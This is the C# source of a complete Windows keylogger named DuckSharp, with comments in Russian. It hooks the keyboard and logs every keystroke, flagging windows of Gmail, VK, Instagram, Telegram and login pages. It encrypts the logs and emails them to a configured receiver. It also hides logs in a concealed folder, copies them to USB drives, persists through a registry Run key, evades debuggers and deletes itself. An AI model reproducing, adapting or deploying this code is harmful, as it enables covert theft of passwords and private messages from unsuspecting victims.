using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace DuckSharp
{
    enum modeType { Mail, File, Memory };
    class Program
    {
        //Настройки
        static bool enableAutorun = bool.Parse(Properties.Resources.ResourceManager.GetString("enableAutorun"));
        static bool generateNumber = bool.Parse(Properties.Resources.ResourceManager.GetString("generateNumber"));
        static int messagePeriod = int.Parse(Properties.Resources.ResourceManager.GetString("messagePeriod"));
        static string name = Properties.Resources.ResourceManager.GetString("name");
        static string receiverMail = Properties.Resources.ResourceManager.GetString("receiverMail");
        static string smtpHost = Properties.Resources.ResourceManager.GetString("smtpHost");
        static int smtpPort = int.Parse(Properties.Resources.ResourceManager.GetString("smtpPort"));
        static string mailUserName = Properties.Resources.ResourceManager.GetString("senderMail");
        static string mailPassword = Properties.Resources.ResourceManager.GetString("senderMailPassword");
        static string fileName = Properties.Resources.ResourceManager.GetString("fileName");
        static string logFileName = Properties.Resources.ResourceManager.GetString("logFileName");
        static string customFolder = Properties.Resources.ResourceManager.GetString("customFolder");
        static string key = Properties.Resources.ResourceManager.GetString("key");

        //Глобальные переменные программы
        static byte[] aeskey;
        static modeType logMode = 0;
        static string data = string.Empty;
        static int lastButton = 0;
        static int previousButton = 0;
        static string folderPath;

        //Константные числа windows
        const int ShiftKey = 16, InsertKey = 45, EndKey = 35;
        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x0100;
        
        //Переменные обработки прерываний
        static LowLevelKeyboardProc _proc = HookCallback;
        static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("user32.dll")]
        static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        static extern int GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(int hWnd, StringBuilder text, int count);

        static void Main(string[] args)
        {
            aeskey = hexToBytes(key);

            if (customFolder == String.Empty)
                folderPath = @"C:\Drivers\";
            else
            {
                folderPath = customFolder;
                if (!folderPath.EndsWith(@"\"))
                    folderPath += @"\";
            }

            if (generateNumber)
            {
                Random rng = new Random();
                name += " #" + rng.Next(0, 9999).ToString();
            }

            System.Timers.Timer timer = new System.Timers.Timer(messagePeriod);
            timer.Elapsed += ProcessLog;
            timer.Start();

            bool isDebugging = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebugging);
            if (isDebugging || IsDebuggerPresent())
                Terminate();

            if(enableAutorun)
                CopyToAutorun();

            try
            {
                //Проверка работоспособности отправки почты и уведомление о начале записи
                SendMail(name + " started", "If you have received this message, mail connections works");
            }
            catch
            {
                //Связь по почте не работает, пишем лог на диск
                logMode = modeType.File;
            }

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);    
        }

        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            /*!
	            \brief Обработка прерывания нажатия на клавишу
                \param nCode Код способа обработки сообщения
                \param wParam Идентификатор сообщения клавиатуры
                \param lParam Указатель на структуру сообщения
            */
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                StringBuilder windowHeaderStringBuilder = new StringBuilder(512);
                GetWindowText(GetForegroundWindow(), windowHeaderStringBuilder, 512);
                string windowHeader = windowHeaderStringBuilder.ToString();

                data += DateTime.Now.ToString("HH:mm:ss");
                data += " ";

                if (windowHeader.Contains("ВКонтакте"))
                    data += "!VK! ";
                else if (windowHeader.Contains("Факультет - электронный журнал"))
                    data += "!IFSPO! ";
                else if (windowHeader.Contains("Gmail"))
                    data += "!GMAIL! ";
                else if (windowHeader.Contains("Instagram"))
                    data += "!INSTA! ";
                else if (windowHeader.Contains("Mail.Ru"))
                    data += "!MAILRU! ";
                else if (windowHeader.Contains("Авторизация"))   //Яндекс почта
                    data += "!YND?! ";
                else if (windowHeader.Contains("Discord - Бесплатный голосовой"))
                    data += "!DISK! ";
                else if (windowHeader.Contains("OK.RU"))
                    data += "!OK! ";
                else if (windowHeader.Contains("Telegram Messenger"))
                    data += "!TG! ";
                else if (windowHeader.Contains("Рамблер") && windowHeader.Contains("медийный портал"))
                    data += "!RAMBL! ";
                
                data += (Keys)vkCode;
                
                switch ((Keys)vkCode)
                {
                    case Keys.A: data += "(Ф)"; break;
                    case Keys.B: data += "(И)"; break;
                    case Keys.C: data += "(С)"; break;
                    case Keys.D: data += "(В)"; break;
                    case Keys.E: data += "(У)"; break;
                    case Keys.F: data += "(А)"; break;
                    case Keys.G: data += "(П)"; break;
                    case Keys.H: data += "(Р)"; break;
                    case Keys.I: data += "(Ш)"; break;
                    case Keys.J: data += "(О)"; break;
                    case Keys.K: data += "(Л)"; break;
                    case Keys.L: data += "(Д)"; break;
                    case Keys.M: data += "(Ь)"; break;
                    case Keys.N: data += "(Т)"; break;
                    case Keys.O: data += "(Щ)"; break;
                    case Keys.P: data += "(З)"; break;
                    case Keys.Q: data += "(Й)"; break;
                    case Keys.R: data += "(К)"; break;
                    case Keys.S: data += "(Ы)"; break;
                    case Keys.T: data += "(Е)"; break;
                    case Keys.U: data += "(Г)"; break;
                    case Keys.V: data += "(М)"; break;
                    case Keys.W: data += "(Ц)"; break;
                    case Keys.X: data += "(Ч)"; break;
                    case Keys.Y: data += "(Н)"; break;
                    case Keys.Z: data += "(Я)"; break;
                    case Keys.Oemtilde: data += "(Ё)"; break;
                    case Keys.Oemcomma: data += "(Б)"; break;
                    case Keys.OemPeriod: data += "(Ю)"; break;
                    case Keys.OemOpenBrackets: data += "(Х)"; break;
                    case Keys.Oem6: data += "(Ъ)"; break;
                    case Keys.Oem1: data += "(Ж)"; break;
                    case Keys.Oem7: data += "(Э)"; break;
                }
                
                if (GetAsyncKeyState(ShiftKey) != 0)
                    data += "+SHIFT";

                data += "\n";
                
                previousButton = lastButton;
                lastButton = vkCode;
                if (previousButton == InsertKey && lastButton == EndKey)
                    CopyToFlash();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static byte[] hexToBytes(string hex)
        {
            /*!
	            \brief Перевод из hex-строки в массив байт
                \param text Входная строка
                \return Массив байт
            */
            byte[] byteArray = new byte[hex.Length / 2];
            for (int i = 0; i < byteArray.Length; i++)
            {
                string strbyte = hex.Substring(i * 2, 2);
                byteArray[i] = byte.Parse(strbyte, System.Globalization.NumberStyles.HexNumber);
            }
            return byteArray;
        }

        static string ToAes256(string src)
        {
            /*!
	            \brief Шифрование строки aes256
	            \param src Исходная строка
                \return Зашифрованная строка
            */
            Aes aes = Aes.Create();
            aes.GenerateIV(); //Генерируем соль
            aes.Key = aeskey;

            ICryptoTransform crypt = aes.CreateEncryptor(aes.Key, aes.IV);
            byte[] encrypted;
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, crypt, CryptoStreamMode.Write))
                    using (StreamWriter sw = new StreamWriter(cs))
                        sw.Write(src);
                encrypted = ms.ToArray(); //Записываем в переменную encrypted зашифрованный поток байтов
            }
            encrypted = encrypted.Concat(aes.IV).ToArray(); //Крепим соль

            StringBuilder hexBuilder = new StringBuilder(encrypted.Length*2);
            foreach(byte element in encrypted)
                hexBuilder.Append(string.Format("{0:x2}", element));
            return hexBuilder.ToString();
        }

        static void ProcessLog(object sender, EventArgs e)
        {
            /*!
	            \brief Шифрование лога и отправка по почте или запись в файл
            */
            string encryptedData = ToAes256(data);
            if (logMode == modeType.Mail)
                SendMail(name + " reports", encryptedData);
            else if (logMode == modeType.File)
                LogToFile(encryptedData);   //Если невозможно отправлять по почте, то пишем на диск

            if (logMode != modeType.Memory) //Если удаётся отправлять письма или записывать на диск
                data = string.Empty;        //Память с текущим логом освобождается
        }

        static void SendMail(string subject, string text)
        {
            /*!
	            \brief Отправка письма по почте
                \param subject Заголовок письма
                \param text Текст письма
            */
            MailMessage letter = new MailMessage(mailUserName, receiverMail, subject, text);
            SmtpClient smtp = new SmtpClient(smtpHost, smtpPort);
            smtp.Credentials = new NetworkCredential(mailUserName, mailPassword);
            smtp.EnableSsl = true;
            smtp.Send(letter);
        }

        static void Terminate()
        {
            /*!
	            \brief Самоудаление файла
            */
            string Body = "Set fso = CreateObject(\"Scripting.FileSystemObject\"): On error resume next: Dim I: I = 0" + Environment.NewLine + "Set File = FSO.GetFile(\"" + Application.ExecutablePath + "\"): Do while I = 0: fso.DeleteFile (\"" + Application.ExecutablePath + "\"): fso.DeleteFile (\"" + Environment.CurrentDirectory + "\\1.vbs\"): " + Environment.NewLine + "If FSO.FileExists(File) = false Then: I = 1: End If: Loop";
            System.IO.File.WriteAllText(Environment.CurrentDirectory + "\\1.vbs", Body, System.Text.Encoding.Default);
            System.Diagnostics.Process.Start(Environment.CurrentDirectory + "\\1.vbs");
            Environment.Exit(0);
        }

        static void CopyToAutorun()
        {
            /*!
	            \brief Копирование исполняемого файла и создании ключа реестра для автозагрузки
            */
            FileInfo me = new FileInfo(Application.ExecutablePath);
            FileInfo goalFile = new FileInfo(folderPath + fileName + ".exe");

            if (customFolder == null)
                if (!System.IO.Directory.Exists(@"C:\Drivers"))
                    try
                    {
                        System.IO.Directory.CreateDirectory(@"C:\Drivers");
                        File.SetAttributes(@"C:\Drivers", FileAttributes.Hidden);
                    }
                    catch { }

            if (!goalFile.Exists)
                try
                {
                    me.CopyTo(goalFile.FullName);
                    RegistryKey reg = Registry.CurrentUser.CreateSubKey(@"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                    reg.SetValue(fileName, goalFile.FullName);
                }
                catch { }
        }

        static void LogToFile(string text)
        {
            /*!
	            \brief Запись лога на диск
                \param text Текст лога
            */
            if (customFolder == null && !System.IO.Directory.Exists(@"C:\Drivers"))
            {
                System.IO.Directory.CreateDirectory(@"C:\Drivers");
                File.SetAttributes(@"C:\Drivers", FileAttributes.Hidden);
            }

            using (StreamWriter sr = File.AppendText(folderPath + logFileName))
                sr.WriteLine(text + "\nENDBLOCK");
        }

        static void CopyToFlash()
        {
            /*!
	            \brief Копирование лога на флешку
            */
            ProcessLog(null, new EventArgs());
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
                if (drive.DriveType == DriveType.Removable)
                    try
                    {
                        if (logMode == modeType.Memory)
                            using (StreamWriter sr = File.AppendText(drive.Name + "logs"))
                                sr.WriteLine(ToAes256(data));
                        else 
                            File.Copy(folderPath + logFileName, drive.Name + "logs", true);
                    }
                    catch { }
        }
    }
}
